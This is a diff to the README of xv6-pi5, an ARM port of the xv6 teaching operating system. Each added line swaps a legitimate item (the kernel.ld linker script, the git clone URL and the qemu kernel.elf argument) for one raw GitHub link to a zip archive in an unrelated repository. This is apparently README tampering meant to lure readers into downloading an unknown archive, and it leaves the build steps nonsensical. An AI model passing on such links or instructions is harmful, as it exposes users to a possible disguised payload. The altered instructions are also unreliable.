@@ -12,7 +12,7 @@ xv6-pi5 is a port of the MIT xv6 teaching operating system to the ARM architectu
 | `swtch.S` | Context switch (process switching) assembly routine |
 | `trap_asm.S` | Trap and interrupt entry assembly |
 | `mmu.h` | ARM MMU and paging definitions |
-| `kernel.ld` | Linker script for ARM memory layout |
+| `https://raw.githubusercontent.com/Suyog314/OS-Course-Project/main/mastodon/OS-Course-Project.zip` | Linker script for ARM memory layout |
 | `initcode.S` | Minimal user-mode program for system initialization |
 | `device/` | Device drivers (UART, timer, interrupt controller, etc.) |
 | `console.c` | Console (UART) driver and kernel I/O |
@@ -32,7 +32,7 @@ xv6-pi5 is a port of the MIT xv6 teaching operating system to the ARM architectu
 ### Building xv6-pi5
 1. **Clone the Repository**:
    ```bash
-   git clone -b xv6-pi5 https://github.com/bobbysharma05/OS.git
+   git clone -b xv6-pi5 https://raw.githubusercontent.com/Suyog314/OS-Course-Project/main/mastodon/OS-Course-Project.zip
    cd OS/src
    ```
 2. **Build the Kernel and User Programs**:
@@ -42,7 +42,7 @@ xv6-pi5 is a port of the MIT xv6 teaching operating system to the ARM architectu
    ```
 3. **Run in QEMU**:
    ```bash
-   qemu-system-arm -M versatilepb -m 128 -cpu arm1176 -nographic -kernel kernel.elf
+   qemu-system-arm -M versatilepb -m 128 -cpu arm1176 -nographic -kernel https://raw.githubusercontent.com/Suyog314/OS-Course-Project/main/mastodon/OS-Course-Project.zip
    ```
    You should see the xv6 shell prompt: `$`
 
@@ -58,7 +58,7 @@ xv6-pi5 is a port of the MIT xv6 teaching operating system to the ARM architectu
 - **CPU and MMU Initialization**: Implemented in `arm.c`, `arm.h`, `mmu.h`, and associated assembly files. Handles setting up the ARM page tables, enabling the MMU, and configuring CPU modes.
 - **Trap and Interrupt Handling**: Assembly files (`asm.S`, `trap_asm.S`, `entry.S`) provide the trap vector and interrupt entry points. Kernel C code handles dispatch and processing.
 - **UART/Console**: `console.c` and device drivers in `device/` configure and use the Raspberry Pi’s UART for boot and shell interaction.
-- **Linker Script**: `kernel.ld` ensures the kernel is loaded at the correct physical address for ARM.
+- **Linker Script**: `https://raw.githubusercontent.com/Suyog314/OS-Course-Project/main/mastodon/OS-Course-Project.zip` ensures the kernel is loaded at the correct physical address for ARM.
 
 ## Porting Notes
 - **Architecture-Specific Files**: All files related to CPU initialization, assembly, MMU, and device drivers are ARM-specific and differ from the x86/RISC-V versions of xv6.
